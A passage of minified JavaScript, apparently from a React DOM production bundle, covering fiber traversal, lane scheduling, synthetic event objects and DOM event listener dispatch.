Error(se(137,t));if(e.dangerouslySetInnerHTML!=null){if(e.children!=null)throw Error(se(60));if(typeof e.dangerouslySetInnerHTML!="object"||!("__html"in e.dangerouslySetInnerHTML))throw Error(se(61))}if(e.style!=null&&typeof e.style!="object")throw Error(se(62))}}function Pu(t,e){if(t.indexOf("-")===-1)return typeof e.is=="string";switch(t){case"annotation-xml":case"color-profile":case"font-face":case"font-face-src":case"font-face-uri":case"font-face-format":case"font-face-name":case"missing-glyph":return!1;default:return!0}}var Lu=null;function _p(t){return t=t.target||t.srcElement||window,t.correspondingUseElement&&(t=t.correspondingUseElement),t.nodeType===3?t.parentNode:t}var ku=null,yr=null,Sr=null;function Fh(t){if(t=Qa(t)){if(typeof ku!="function")throw Error(se(280));var e=t.stateNode;e&&(e=Yl(e),ku(t.stateNode,t.type,e))}}function Mg(t){yr?Sr?Sr.push(t):Sr=[t]:yr=t}function Eg(){if(yr){var t=yr,e=Sr;if(Sr=yr=null,Fh(t),e)for(t=0;t<e.length;t++)Fh(e[t])}}function Tg(t,e){return t(e)}function Ag(){}var vc=!1;function Cg(t,e,n){if(vc)return t(e,n);vc=!0;try{return Tg(t,e,n)}finally{vc=!1,(yr!==null||Sr!==null)&&(Ag(),Eg())}}function Ta(t,e){var n=t.stateNode;if(n===null)return null;var i=Yl(n);if(i===null)return null;n=i[e];e:switch(e){case"onClick":case"onClickCapture":case"onDoubleClick":case"onDoubleClickCapture":case"onMouseDown":case"onMouseDownCapture":case"onMouseMove":case"onMouseMoveCapture":case"onMouseUp":case"onMouseUpCapture":case"onMouseEnter":(i=!i.disabled)||(t=t.type,i=!(t==="button"||t==="input"||t==="select"||t==="textarea")),t=!i;break e;default:t=!1}if(t)return null;if(n&&typeof n!="function")throw Error(se(231,e,typeof n));return n}var Nu=!1;if(Ai)try{var Yr={};Object.defineProperty(Yr,"passive",{get:function(){Nu=!0}}),window.addEventListener("test",Yr,Yr),window.removeEventListener("test",Yr,Yr)}catch{Nu=!1}function ax(t,e,n,i,s,r,a,o,l){var c=Array.prototype.slice.call(arguments,3);try{e.apply(n,c)}catch(d){this.onError(d)}}var ga=!1,fl=null,ml=!1,Du=null,ox={onError:function(t){ga=!0,fl=t}};function lx(t,e,n,i,s,r,a,o,l){ga=!1,fl=null,ax.apply(ox,arguments)}function cx(t,e,n,i,s,r,a,o,l){if(lx.apply(this,arguments),ga){if(ga){var c=fl;ga=!1,fl=null}else throw Error(se(198));ml||(ml=!0,Du=c)}}function Hs(t){var e=t,n=t;if(t.alternate)for(;e.return;)e=e.return;else{t=e;do e=t,e.flags&4098&&(n=e.return),t=e.return;while(t)}return e.tag===3?n:null}function Rg(t){if(t.tag===13){var e=t.memoizedState;if(e===null&&(t=t.alternate,t!==null&&(e=t.memoizedState)),e!==null)return e.dehydrated}return null}function Bh(t){if(Hs(t)!==t)throw Error(se(188))}function ux(t){var e=t.alternate;if(!e){if(e=Hs(t),e===null)throw Error(se(188));return e!==t?null:t}for(var n=t,i=e;;){var s=n.return;if(s===null)break;var r=s.alternate;if(r===null){if(i=s.return,i!==null){n=i;continue}break}if(s.child===r.child){for(r=s.child;r;){if(r===n)return Bh(s),t;if(r===i)return Bh(s),e;r=r.sibling}throw Error(se(188))}if(n.return!==i.return)n=s,i=r;else{for(var a=!1,o=s.child;o;){if(o===n){a=!0,n=s,i=r;break}if(o===i){a=!0,i=s,n=r;break}o=o.sibling}if(!a){for(o=r.child;o;){if(o===n){a=!0,n=r,i=s;break}if(o===i){a=!0,i=r,n=s;break}o=o.sibling}if(!a)throw Error(se(189))}}if(n.alternate!==i)throw Error(se(190))}if(n.tag!==3)throw Error(se(188));return n.stateNode.current===n?t:e}function Pg(t){return t=ux(t),t!==null?Lg(t):null}function Lg(t){if(t.tag===5||t.tag===6)return t;for(t=t.child;t!==null;){var e=Lg(t);if(e!==null)return e;t=t.sibling}return null}var kg=Mn.unstable_scheduleCallback,zh=Mn.unstable_cancelCallback,dx=Mn.unstable_shouldYield,px=Mn.unstable_requestPaint,Et=Mn.unstable_now,hx=Mn.unstable_getCurrentPriorityLevel,xp=Mn.unstable_ImmediatePriority,Ng=Mn.unstable_UserBlockingPriority,gl=Mn.unstable_NormalPriority,fx=Mn.unstable_LowPriority,Dg=Mn.unstable_IdlePriority,Wl=null,ii=null;function mx(t){if(ii&&typeof ii.onCommitFiberRoot=="function")try{ii.onCommitFiberRoot(Wl,t,void 0,(t.current.flags&128)===128)}catch{}}var Xn=Math.clz32?Math.clz32:_x,gx=Math.log,vx=Math.LN2;function _x(t){return t>>>=0,t===0?32:31-(gx(t)/vx|0)|0}var fo=64,mo=4194304;function da(t){switch(t&-t){case 1:return 1;case 2:return 2;case 4:return 4;case 8:return 8;case 16:return 16;case 32:return 32;case 64:case 128:case 256:case 512:case 1024:case 2048:case 4096:case 8192:case 16384:case 32768:case 65536:case 131072:case 262144:case 524288:case 1048576:case 2097152:return t&4194240;case 4194304:case 8388608:case 16777216:case 33554432:case 67108864:return t&130023424;case 134217728:return 134217728;case 268435456:return 268435456;case 536870912:return 536870912;case 1073741824:return 1073741824;default:return t}}function vl(t,e){var n=t.pendingLanes;if(n===0)return 0;var i=0,s=t.suspendedLanes,r=t.pingedLanes,a=n&268435455;if(a!==0){var o=a&~s;o!==0?i=da(o):(r&=a,r!==0&&(i=da(r)))}else a=n&~s,a!==0?i=da(a):r!==0&&(i=da(r));if(i===0)return 0;if(e!==0&&e!==i&&!(e&s)&&(s=i&-i,r=e&-e,s>=r||s===16&&(r&4194240)!==0))return e;if(i&4&&(i|=n&16),e=t.entangledLanes,e!==0)for(t=t.entanglements,e&=i;0<e;)n=31-Xn(e),s=1<<n,i|=t[n],e&=~s;return i}function xx(t,e){switch(t){case 1:case 2:case 4:return e+250;case 8:case 16:case 32:case 64:case 128:case 256:case 512:case 1024:case 2048:case 4096:case 8192:case 16384:case 32768:case 65536:case 131072:case 262144:case 524288:case 1048576:case 2097152:return e+5e3;case 4194304:case 8388608:case 16777216:case 33554432:case 67108864:return-1;case 134217728:case 268435456:case 536870912:case 1073741824:return-1;default:return-1}}function yx(t,e){for(var n=t.suspendedLanes,i=t.pingedLanes,s=t.expirationTimes,r=t.pendingLanes;0<r;){var a=31-Xn(r),o=1<<a,l=s[a];l===-1?(!(o&n)||o&i)&&(s[a]=xx(o,e)):l<=e&&(t.expiredLanes|=o),r&=~o}}function Iu(t){return t=t.pendingLanes&-1073741825,t!==0?t:t&1073741824?1073741824:0}function Ig(){var t=fo;return fo<<=1,!(fo&4194240)&&(fo=64),t}function _c(t){for(var e=[],n=0;31>n;n++)e.push(t);return e}function Za(t,e,n){t.pendingLanes|=e,e!==536870912&&(t.suspendedLanes=0,t.pingedLanes=0),t=t.eventTimes,e=31-Xn(e),t[e]=n}function Sx(t,e){var n=t.pendingLanes&~e;t.pendingLanes=e,t.suspendedLanes=0,t.pingedLanes=0,t.expiredLanes&=e,t.mutableReadLanes&=e,t.entangledLanes&=e,e=t.entanglements;var i=t.eventTimes;for(t=t.expirationTimes;0<n;){var s=31-Xn(n),r=1<<s;e[s]=0,i[s]=-1,t[s]=-1,n&=~r}}function yp(t,e){var n=t.entangledLanes|=e;for(t=t.entanglements;n;){var i=31-Xn(n),s=1<<i;s&e|t[i]&e&&(t[i]|=e),n&=~s}}var rt=0;function Ug(t){return t&=-t,1<t?4<t?t&268435455?16:536870912:4:1}var Og,Sp,Fg,Bg,zg,Uu=!1,go=[],Ji=null,Qi=null,es=null,Aa=new Map,Ca=new Map,ji=[],bx="mousedown mouseup touchcancel touchend touchstart auxclick dblclick pointercancel pointerdown pointerup dragend dragstart drop compositionend compositionstart keydown keypress keyup input textInput copy cut paste click change contextmenu reset submit".split(" ");function Vh(t,e){switch(t){case"focusin":case"focusout":Ji=null;break;case"dragenter":case"dragleave":Qi=null;break;case"mouseover":case"mouseout":es=null;break;case"pointerover":case"pointerout":Aa.delete(e.pointerId);break;case"gotpointercapture":case"lostpointercapture":Ca.delete(e.pointerId)}}function $r(t,e,n,i,s,r){return t===null||t.nativeEvent!==r?(t={blockedOn:e,domEventName:n,eventSystemFlags:i,nativeEvent:r,targetContainers:[s]},e!==null&&(e=Qa(e),e!==null&&Sp(e)),t):(t.eventSystemFlags|=i,e=t.targetContainers,s!==null&&e.indexOf(s)===-1&&e.push(s),t)}function wx(t,e,n,i,s){switch(e){case"focusin":return Ji=$r(Ji,t,e,n,i,s),!0;case"dragenter":return Qi=$r(Qi,t,e,n,i,s),!0;case"mouseover":return es=$r(es,t,e,n,i,s),!0;case"pointerover":var r=s.pointerId;return Aa.set(r,$r(Aa.get(r)||null,t,e,n,i,s)),!0;case"gotpointercapture":return r=s.pointerId,Ca.set(r,$r(Ca.get(r)||null,t,e,n,i,s)),!0}return!1}function Vg(t){var e=As(t.target);if(e!==null){var n=Hs(e);if(n!==null){if(e=n.tag,e===13){if(e=Rg(n),e!==null){t.blockedOn=e,zg(t.priority,function(){Fg(n)});return}}else if(e===3&&n.stateNode.current.memoizedState.isDehydrated){t.blockedOn=n.tag===3?n.stateNode.containerInfo:null;return}}}t.blockedOn=null}function Zo(t){if(t.blockedOn!==null)return!1;for(var e=t.targetContainers;0<e.length;){var n=Ou(t.domEventName,t.eventSystemFlags,e[0],t.nativeEvent);if(n===null){n=t.nativeEvent;var i=new n.constructor(n.type,n);Lu=i,n.target.dispatchEvent(i),Lu=null}else return e=Qa(n),e!==null&&Sp(e),t.blockedOn=n,!1;e.shift()}return!0}function Hh(t,e,n){Zo(t)&&n.delete(e)}function Mx(){Uu=!1,Ji!==null&&Zo(Ji)&&(Ji=null),Qi!==null&&Zo(Qi)&&(Qi=null),es!==null&&Zo(es)&&(es=null),Aa.forEach(Hh),Ca.forEach(Hh)}function Kr(t,e){t.blockedOn===e&&(t.blockedOn=null,Uu||(Uu=!0,Mn.unstable_scheduleCallback(Mn.unstable_NormalPriority,Mx)))}function Ra(t){function e(s){return Kr(s,t)}if(0<go.length){Kr(go[0],t);for(var n=1;n<go.length;n++){var i=go[n];i.blockedOn===t&&(i.blockedOn=null)}}for(Ji!==null&&Kr(Ji,t),Qi!==null&&Kr(Qi,t),es!==null&&Kr(es,t),Aa.forEach(e),Ca.forEach(e),n=0;n<ji.length;n++)i=ji[n],i.blockedOn===t&&(i.blockedOn=null);for(;0<ji.length&&(n=ji[0],n.blockedOn===null);)Vg(n),n.blockedOn===null&&ji.shift()}var br=Ni.ReactCurrentBatchConfig,_l=!0;function Ex(t,e,n,i){var s=rt,r=br.transition;br.transition=null;try{rt=1,bp(t,e,n,i)}finally{rt=s,br.transition=r}}function Tx(t,e,n,i){var s=rt,r=br.transition;br.transition=null;try{rt=4,bp(t,e,n,i)}finally{rt=s,br.transition=r}}function bp(t,e,n,i){if(_l){var s=Ou(t,e,n,i);if(s===null)Cc(t,e,i,xl,n),Vh(t,i);else if(wx(s,t,e,n,i))i.stopPropagation();else if(Vh(t,i),e&4&&-1<bx.indexOf(t)){for(;s!==null;){var r=Qa(s);if(r!==null&&Og(r),r=Ou(t,e,n,i),r===null&&Cc(t,e,i,xl,n),r===s)break;s=r}s!==null&&i.stopPropagation()}else Cc(t,e,i,null,n)}}var xl=null;function Ou(t,e,n,i){if(xl=null,t=_p(i),t=As(t),t!==null)if(e=Hs(t),e===null)t=null;else if(n=e.tag,n===13){if(t=Rg(e),t!==null)return t;t=null}else if(n===3){if(e.stateNode.current.memoizedState.isDehydrated)return e.tag===3?e.stateNode.containerInfo:null;t=null}else e!==t&&(t=null);return xl=t,null}function Hg(t){switch(t){case"cancel":case"click":case"close":case"contextmenu":case"copy":case"cut":case"auxclick":case"dblclick":case"dragend":case"dragstart":case"drop":case"focusin":case"focusout":case"input":case"invalid":case"keydown":case"keypress":case"keyup":case"mousedown":case"mouseup":case"paste":case"pause":case"play":case"pointercancel":case"pointerdown":case"pointerup":case"ratechange":case"reset":case"resize":case"seeked":case"submit":case"touchcancel":case"touchend":case"touchstart":case"volumechange":case"change":case"selectionchange":case"textInput":case"compositionstart":case"compositionend":case"compositionupdate":case"beforeblur":case"afterblur":case"beforeinput":case"blur":case"fullscreenchange":case"focus":case"hashchange":case"popstate":case"select":case"selectstart":return 1;case"drag":case"dragenter":case"dragexit":case"dragleave":case"dragover":case"mousemove":case"mouseout":case"mouseover":case"pointermove":case"pointerout":case"pointerover":case"scroll":case"toggle":case"touchmove":case"wheel":case"mouseenter":case"mouseleave":case"pointerenter":case"pointerleave":return 4;case"message":switch(hx()){case xp:return 1;case Ng:return 4;case gl:case fx:return 16;case Dg:return 536870912;default:return 16}default:return 16}}var Yi=null,wp=null,Jo=null;function Gg(){if(Jo)return Jo;var t,e=wp,n=e.length,i,s="value"in Yi?Yi.value:Yi.textContent,r=s.length;for(t=0;t<n&&e[t]===s[t];t++);var a=n-t;for(i=1;i<=a&&e[n-i]===s[r-i];i++);return Jo=s.slice(t,1<i?1-i:void 0)}function Qo(t){var e=t.keyCode;return"charCode"in t?(t=t.charCode,t===0&&e===13&&(t=13)):t=e,t===10&&(t=13),32<=t||t===13?t:0}function vo(){return!0}function Gh(){return!1}function Tn(t){function e(n,i,s,r,a){this._reactName=n,this._targetInst=s,this.type=i,this.nativeEvent=r,this.target=a,this.currentTarget=null;for(var o in t)t.hasOwnProperty(o)&&(n=t[o],this[o]=n?n(r):r[o]);return this.isDefaultPrevented=(r.defaultPrevented!=null?r.defaultPrevented:r.returnValue===!1)?vo:Gh,this.isPropagationStopped=Gh,this}return xt(e.prototype,{preventDefault:function(){this.defaultPrevented=!0;var n=this.nativeEvent;n&&(n.preventDefault?n.preventDefault():typeof n.returnValue!="unknown"&&(n.returnValue=!1),this.isDefaultPrevented=vo)},stopPropagation:function(){var n=this.nativeEvent;n&&(n.stopPropagation?n.stopPropagation():typeof n.cancelBubble!="unknown"&&(n.cancelBubble=!0),this.isPropagationStopped=vo)},persist:function(){},isPersistent:vo}),e}var zr={eventPhase:0,bubbles:0,cancelable:0,timeStamp:function(t){return t.timeStamp||Date.now()},defaultPrevented:0,isTrusted:0},Mp=Tn(zr),Ja=xt({},zr,{view:0,detail:0}),Ax=Tn(Ja),xc,yc,Zr,jl=xt({},Ja,{screenX:0,screenY:0,clientX:0,clientY:0,pageX:0,pageY:0,ctrlKey:0,shiftKey:0,altKey:0,metaKey:0,getModifierState:Ep,button:0,buttons:0,relatedTarget:function(t){return t.relatedTarget===void 0?t.fromElement===t.srcElement?t.toElement:t.fromElement:t.relatedTarget},movementX:function(t){return"movementX"in t?t.movementX:(t!==Zr&&(Zr&&t.type==="mousemove"?(xc=t.screenX-Zr.screenX,yc=t.screenY-Zr.screenY):yc=xc=0,Zr=t),xc)},movementY:function(t){return"movementY"in t?t.movementY:yc}}),Wh=Tn(jl),Cx=xt({},jl,{dataTransfer:0}),Rx=Tn(Cx),Px=xt({},Ja,{relatedTarget:0}),Sc=Tn(Px),Lx=xt({},zr,{animationName:0,elapsedTime:0,pseudoElement:0}),kx=Tn(Lx),Nx=xt({},zr,{clipboardData:function(t){return"clipboardData"in t?t.clipboardData:window.clipboardData}}),Dx=Tn(Nx),Ix=xt({},zr,{data:0}),jh=Tn(Ix),Ux={Esc:"Escape",Spacebar:" ",Left:"ArrowLeft",Up:"ArrowUp",Right:"ArrowRight",Down:"ArrowDown",Del:"Delete",Win:"OS",Menu:"ContextMenu",Apps:"ContextMenu",Scroll:"ScrollLock",MozPrintableKey:"Unidentified"},Ox={8:"Backspace",9:"Tab",12:"Clear",13:"Enter",16:"Shift",17:"Control",18:"Alt",19:"Pause",20:"CapsLock",27:"Escape",32:" ",33:"PageUp",34:"PageDown",35:"End",36:"Home",37:"ArrowLeft",38:"ArrowUp",39:"ArrowRight",40:"ArrowDown",45:"Insert",46:"Delete",112:"F1",113:"F2",114:"F3",115:"F4",116:"F5",117:"F6",118:"F7",119:"F8",120:"F9",121:"F10",122:"F11",123:"F12",144:"NumLock",145:"ScrollLock",224:"Meta"},Fx={Alt:"altKey",Control:"ctrlKey",Meta:"metaKey",Shift:"shiftKey"};function Bx(t){var e=this.nativeEvent;return e.getModifierState?e.getModifierState(t):(t=Fx[t])?!!e[t]:!1}function Ep(){return Bx}var zx=xt({},Ja,{key:function(t){if(t.key){var e=Ux[t.key]||t.key;if(e!=="Unidentified")return e}return t.type==="keypress"?(t=Qo(t),t===13?"Enter":String.fromCharCode(t)):t.type==="keydown"||t.type==="keyup"?Ox[t.keyCode]||"Unidentified":""},code:0,location:0,ctrlKey:0,shiftKey:0,altKey:0,metaKey:0,repeat:0,locale:0,getModifierState:Ep,charCode:function(t){return t.type==="keypress"?Qo(t):0},keyCode:function(t){return t.type==="keydown"||t.type==="keyup"?t.keyCode:0},which:function(t){return t.type==="keypress"?Qo(t):t.type==="keydown"||t.type==="keyup"?t.keyCode:0}}),Vx=Tn(zx),Hx=xt({},jl,{pointerId:0,width:0,height:0,pressure:0,tangentialPressure:0,tiltX:0,tiltY:0,twist:0,pointerType:0,isPrimary:0}),Xh=Tn(Hx),Gx=xt({},Ja,{touches:0,targetTouches:0,changedTouches:0,altKey:0,metaKey:0,ctrlKey:0,shiftKey:0,getModifierState:Ep}),Wx=Tn(Gx),jx=xt({},zr,{propertyName:0,elapsedTime:0,pseudoElement:0}),Xx=Tn(jx),qx=xt({},jl,{deltaX:function(t){return"deltaX"in t?t.deltaX:"wheelDeltaX"in t?-t.wheelDeltaX:0},deltaY:function(t){return"deltaY"in t?t.deltaY:"wheelDeltaY"in t?-t.wheelDeltaY:"wheelDelta"in t?-t.wheelDelta:0},deltaZ:0,deltaMode:0}),Yx=Tn(qx),$x=[9,13,27,32],Tp=Ai&&"CompositionEvent"in window,va=null;Ai&&"documentMode"in document&&(va=document.documentMode);var Kx=Ai&&"TextEvent"in window&&!va,Wg=Ai&&(!Tp||va&&8<va&&11>=va),qh=" ",Yh=!1;function jg(t,e){switch(t){case"keyup":return $x.indexOf(e.keyCode)!==-1;case"keydown":return e.keyCode!==229;case"keypress":case"mousedown":case"focusout":return!0;default:return!1}}function Xg(t){return t=t.detail,typeof t=="object"&&"data"in t?t.data:null}var cr=!1;function Zx(t,e){switch(t){case"compositionend":return Xg(e);case"keypress":return e.which!==32?null:(Yh=!0,qh);case"textInput":return t=e.data,t===qh&&Yh?null:t;default:return null}}function Jx(t,e){if(cr)return t==="compositionend"||!Tp&&jg(t,e)?(t=Gg(),Jo=wp=Yi=null,cr=!1,t):null;switch(t){case"paste":return null;case"keypress":if(!(e.ctrlKey||e.altKey||e.metaKey)||e.ctrlKey&&e.altKey){if(e.char&&1<e.char.length)return e.char;if(e.which)return String.fromCharCode(e.which)}return null;case"compositionend":return Wg&&e.locale!=="ko"?null:e.data;default:return null}}var Qx={color:!0,date:!0,datetime:!0,"datetime-local":!0,email:!0,month:!0,number:!0,password:!0,range:!0,search:!0,tel:!0,text:!0,time:!0,url:!0,week:!0};function $h(t){var e=t&&t.nodeName&&t.nodeName.toLowerCase();return e==="input"?!!Qx[t.type]:e==="textarea"}function qg(t,e,n,i){Mg(i),e=yl(e,"onChange"),0<e.length&&(n=new Mp("onChange","change",null,n,i),t.push({event:n,listeners:e}))}var _a=null,Pa=null;function ey(t){sv(t,0)}function Xl(t){var e=pr(t);if(vg(e))return t}function ty(t,e){if(t==="change")return e}var Yg=!1;if(Ai){var bc;if(Ai){var wc="oninput"in document;if(!wc){var Kh=document.createElement("div");Kh.setAttribute("oninput","return;"),wc=typeof Kh.oninput=="function"}bc=wc}else bc=!1;Yg=bc&&(!document.documentMode||9<document.documentMode)}function Zh(){_a&&(_a.detachEvent("onpropertychange",$g),Pa=_a=null)}function $g(t){if(t.propertyName==="value"&&Xl(Pa)){var e=[];qg(e,Pa,t,_p(t)),Cg(ey,e)}}function ny(t,e,n){t==="focusin"?(Zh(),_a=e,Pa=n,_a.attachEvent("onpropertychange",$g)):t==="focusout"&&Zh()}function iy(t){if(t==="selectionchange"||t==="keyup"||t==="keydown")return Xl(Pa)}function sy(t,e){if(t==="click")return Xl(e)}function ry(t,e){if(t==="input"||t==="change")return Xl(e)}function ay(t,e){return t===e&&(t!==0||1/t===1/e)||t!==t&&e!==e}var Yn=typeof Object.is=="function"?Object.is:ay;function La(t,e){if(Yn(t,e))return!0;if(typeof t!="object"||t===null||typeof e!="object"||e===null)return!1;var n=Object.keys(t),i=Object.keys(e);if(n.length!==i.length)return!1;for(i=0;i<n.length;i++){var s=n[i];if(!xu.call(e,s)||!Yn(t[s],e[s]))return!1}return!0}function Jh(t){for(;t&&t.firstChild;)t=t.firstChild;return t}function Qh(t,e){var n=Jh(t);t=0;for(var i;n;){if(n.nodeType===3){if(i=t+n.textContent.length,t<=e&&i>=e)return{node:n,offset:e-t};t=i}e:{for(;n;){if(n.nextSibling){n=n.nextSibling;break e}n=n.parentNode}n=void 0}n=Jh(n)}}function Kg(t,e){return t&&e?t===e?!0:t&&t.nodeType===3?!1:e&&e.nodeType===3?Kg(t,e.parentNode):"contains"in t?t.contains(e):t.compareDocumentPosition?!!(t.compareDocumentPosition(e)&16):!1:!1}function Zg(){for(var t=window,e=hl();e instanceof t.HTMLIFrameElement;){try{var n=typeof e.contentWindow.location.href=="string"}catch{n=!1}if(n)t=e.contentWindow;else break;e=hl(t.document)}return e}function Ap(t){var e=t&&t.nodeName&&t.nodeName.toLowerCase();return e&&(e==="input"&&(t.type==="text"||t.type==="search"||t.type==="tel"||t.type==="url"||t.type==="password")||e==="textarea"||t.contentEditable==="true")}function oy(t){var e=Zg(),n=t.focusedElem,i=t.selectionRange;if(e!==n&&n&&n.ownerDocument&&Kg(n.ownerDocument.documentElement,n)){if(i!==null&&Ap(n)){if(e=i.start,t=i.end,t===void 0&&(t=e),"selectionStart"in n)n.selectionStart=e,n.selectionEnd=Math.min(t,n.value.length);else if(t=(e=n.ownerDocument||document)&&e.defaultView||window,t.getSelection){t=t.getSelection();var s=n.textContent.length,r=Math.min(i.start,s);i=i.end===void 0?r:Math.min(i.end,s),!t.extend&&r>i&&(s=i,i=r,r=s),s=Qh(n,r);var a=Qh(n,i);s&&a&&(t.rangeCount!==1||t.anchorNode!==s.node||t.anchorOffset!==s.offset||t.focusNode!==a.node||t.focusOffset!==a.offset)&&(e=e.createRange(),e.setStart(s.node,s.offset),t.removeAllRanges(),r>i?(t.addRange(e),t.extend(a.node,a.offset)):(e.setEnd(a.node,a.offset),t.addRange(e)))}}for(e=[],t=n;t=t.parentNode;)t.nodeType===1&&e.push({element:t,left:t.scrollLeft,top:t.scrollTop});for(typeof n.focus=="function"&&n.focus(),n=0;n<e.length;n++)t=e[n],t.element.scrollLeft=t.left,t.element.scrollTop=t.top}}var ly=Ai&&"documentMode"in document&&11>=document.documentMode,ur=null,Fu=null,xa=null,Bu=!1;function ef(t,e,n){var i=n.window===n?n.document:n.nodeType===9?n:n.ownerDocument;Bu||ur==null||ur!==hl(i)||(i=ur,"selectionStart"in i&&Ap(i)?i={start:i.selectionStart,end:i.selectionEnd}:(i=(i.ownerDocument&&i.ownerDocument.defaultView||window).getSelection(),i={anchorNode:i.anchorNode,anchorOffset:i.anchorOffset,focusNode:i.focusNode,focusOffset:i.focusOffset}),xa&&La(xa,i)||(xa=i,i=yl(Fu,"onSelect"),0<i.length&&(e=new Mp("onSelect","select",null,e,n),t.push({event:e,listeners:i}),e.target=ur)))}function _o(t,e){var n={};return n[t.toLowerCase()]=e.toLowerCase(),n["Webkit"+t]="webkit"+e,n["Moz"+t]="moz"+e,n}var dr={animationend:_o("Animation","AnimationEnd"),animationiteration:_o("Animation","AnimationIteration"),animationstart:_o("Animation","AnimationStart"),transitionend:_o("Transition","TransitionEnd")},Mc={},Jg={};Ai&&(Jg=document.createElement("div").style,"AnimationEvent"in window||(delete dr.animationend.animation,delete dr.animationiteration.animation,delete dr.animationstart.animation),"TransitionEvent"in window||delete dr.transitionend.transition);function ql(t){if(Mc[t])return Mc[t];if(!dr[t])return t;var e=dr[t],n;for(n in e)if(e.hasOwnProperty(n)&&n in Jg)return Mc[t]=e[n];return t}var Qg=ql("animationend"),ev=ql("animationiteration"),tv=ql("animationstart"),nv=ql("transitionend"),iv=new Map,tf="abort auxClick cancel canPlay canPlayThrough click close contextMenu copy cut drag dragEnd dragEnter dragExit dragLeave dragOver dragStart drop durationChange emptied encrypted ended error gotPointerCapture input invalid keyDown keyPress keyUp load loadedData loadedMetadata loadStart lostPointerCapture mouseDown mouseMove mouseOut mouseOver mouseUp paste pause play playing pointerCancel pointerDown pointerMove pointerOut pointerOver pointerUp progress rateChange reset resize seeked seeking stalled submit suspend timeUpdate touchCancel touchEnd touchStart volumeChange scroll toggle touchMove waiting wheel".split(" ");function us(t,e){iv.set(t,e),Vs(e,[t])}for(var Ec=0;Ec<tf.length;Ec++){var Tc=tf[Ec],cy=Tc.toLowerCase(),uy=Tc[0].toUpperCase()+Tc.slice(1);us(cy,"on"+uy)}us(Qg,"onAnimationEnd");us(ev,"onAnimationIteration");us(tv,"onAnimationStart");us("dblclick","onDoubleClick");us("focusin","onFocus");us("focusout","onBlur");us(nv,"onTransitionEnd");Ar("onMouseEnter",["mouseout","mouseover"]);Ar("onMouseLeave",["mouseout","mouseover"]);Ar("onPointerEnter",["pointerout","pointerover"]);Ar("onPointerLeave",["pointerout","pointerover"]);Vs("onChange","change click focusin focusout input keydown keyup selectionchange".split(" "));Vs("onSelect","focusout contextmenu dragend focusin keydown keyup mousedown mouseup selectionchange".split(" "));Vs("onBeforeInput",["compositionend","keypress","textInput","paste"]);Vs("onCompositionEnd","compositionend focusout keydown keypress keyup mousedown".split(" "));Vs("onCompositionStart","compositionstart focusout keydown keypress keyup mousedown".split(" "));Vs("onCompositionUpdate","compositionupdate focusout keydown keypress keyup mousedown".split(" "));var pa="abort canplay canplaythrough durationchange emptied encrypted ended error loadeddata loadedmetadata loadstart pause play playing progress ratechange resize seeked seeking stalled suspend timeupdate volumechange waiting".split(" "),dy=new Set("cancel close invalid load scroll toggle".split(" ").concat(pa));function nf(t,e,n){var i=t.type||"unknown-event";t.currentTarget=n,cx(i,e,void 0,t),t.currentTarget=null}function sv(t,e){e=(e&4)!==0;for(var n=0;n<t.length;n++){var i=t[n],s=i.event;i=i.listeners;e:{var r=void 0;if(e)for(var a=i.length-1;0<=a;a--){var o=i[a],l=o.instance,c=o.currentTarget;if(o=o.listener,l!==r&&s.isPropagationStopped())break e;nf(s,o,c),r=l}else for(a=0;a<i.length;a++){if(o=i[a],l=o.instance,c=o.currentTarget,o=o.listener,l!==r&&s.isPropagationStopped())break e;nf(s,o,c),r=l}}}if(ml)throw t=Du,ml=!1,Du=null,t}function ht(t,e){var n=e[Wu];n===void 0&&(n=e[Wu]=new Set);var i=t+"__bubble";n.has(i)||(rv(e,t,2,!1),n.add(i))}function Ac(t,e,n){var i=0;e&&(i|=4),rv(n,t,i,e)}var xo="_reactListening"+Math.random().toString(36).slice(2);function ka(t){if(!t[xo]){t[xo]=!0,pg.forEach(function(n){n!=="selectionchange"&&(dy.has(n)||Ac(n,!1,t),Ac(n,!0,t))});var e=t.nodeType===9?t:t.ownerDocument;e===null||e[xo]||(e[xo]=!0,Ac("selectionchange",!1,e))}}function rv(t,e,n,i){switch(Hg(e)){case 1:var s=Ex;break;case 4:s=Tx;break;default:s=bp}n=s.bind(null,e,n,t),s=void 0,!Nu||e!=="touchstart"&&e!=="touchmove"&&e!=="wheel"||(s=!0),i?s!==void 0?t.addEventListener(e,n,{capture:!0,passive:s}):t.addEventListener(e,n,!0):s!==void 0?t.addEventListener(e,n,{passive:s}):t.addEventListener(e,n,!1)}function Cc(t,e,n,i,s){var r=i;if(!(e&1)&&!(e&2)&&i!==null)e:for(;;){if(i===null)return;var a=i.tag;if(a===3||a===4){var o=i.stateNode.containerInfo;if(o===s||o.nodeType===8&&o.parentNode===s)break;if(a===4)for(a=i.return;a!==null;){var l=a.tag;if((l===3||l===4)&&(l=a.stateNode.containerInfo,l===s||l.nodeType===8&&l.parentNode===s))return;a=a.return}for(;o!==null;){if(a=As(o),a===null)return;if(l=a.tag,l===5||l===6){i=r=a;continue e}o=o.parentNode}}i=i.return}Cg(function(){var c=r,d=_p(n),p=[];e:{var h=iv.get(t);if(h!==void 0){var f=Mp,_=t;switch(t){case"keypress":if(Qo(n)===0)break e;case"keydown":case"keyup":f=Vx;break;case"focusin":_="focus",f=Sc;break;case"focusout":_="blur",f=Sc;break;case"beforeblur":case"afterblur":f=Sc;break;case"click":if(n.button===2)break e;case"auxclick":case"dblclick":case"mousedown":case"mousemove":case"mouseup":case"mouseout":case"mouseover":case"contextmenu":f=Wh;break;case"drag":case"dragend":case"dragenter":case"dragexit":case"dragleave":case"dragover":case"dragstart":case"drop":f=Rx;break;case"touchcancel":case"touchend":case"touchmove":case"touchstart":f=Wx;break;case Qg:case ev:case tv:f=kx;break;case nv:f=Xx;break;case"scroll":f=Ax;break;case"wheel":f=Yx;break;case"copy":case"cut":case"paste":f=Dx;break;case"gotpointercapture":case"lostpointercapture":case"pointercancel":case"pointerdown":case"pointermove":case"pointerout":case"pointerover":case"pointerup":f=Xh}var y=(e&4)!==0,m=!y&&t==="scroll",u=y?h!==null?h+"Capture":null:h;y=[];for(var g=c,x;g!==null;){x=g;var S=x.stateNode;if(x.tag===5&&S!==null&&(x=S,u!==null&&(S=Ta(g,u),S!=null&&y.push(Na(g,S,x)))),m)break;g=g.return}0<y.length&&(h=new f(h,_,null,n,d),p.push({event:h,listeners:y}))}}if(!(e&7)){e:{if(h=t==="mouseover"||t==="pointerover",f=t==="mouseout"||t==="pointerout",h&&n!==Lu&&(_=n.relatedTarget||n.fromElement)&&(As(_)||_[Ci]))break 